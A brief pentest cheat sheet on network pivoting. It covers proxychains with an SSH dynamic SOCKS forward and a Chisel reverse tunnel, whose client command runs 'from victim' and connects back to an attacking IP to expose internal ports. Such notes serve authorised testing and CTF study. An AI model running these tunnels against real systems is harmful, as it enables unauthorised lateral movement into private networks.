
### **Proxychains**:
1. Edit **last** **line** for */etc/proxychains4.conf*
2. **Add socks4** proxy for localhost and desired port
3. **Dynamic** **SSH Forwarding**:
a. ssh -NfD [desired_port] user@middle_machine

### **Chisel**:
1. **From attacker:**
a. chisel server -p 8000 --reverse
2. **From victim:**
a. chisel client attacking_ip:8000 R:listening_port:victim_ip:target_port


